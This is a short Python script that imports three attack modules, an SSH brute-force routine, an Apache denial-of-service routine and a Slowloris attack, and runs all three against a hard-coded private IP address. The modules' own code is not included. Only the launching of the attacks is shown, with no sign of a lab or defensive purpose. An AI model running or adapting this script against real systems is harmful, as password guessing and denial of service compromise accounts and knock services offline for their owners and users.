from __future__ import absolute_import

from brute_force_ssh import run_brute_force_ssh
from dos_apache2 import run_dos_apache
from slowloris import run_slow_loris

IP_TO_ATTACK = "192.168.1.78"

run_brute_force_ssh(ip=IP_TO_ATTACK)
run_dos_apache(url=f"http://{IP_TO_ATTACK}:80/")
run_slow_loris(ip=IP_TO_ATTACK)
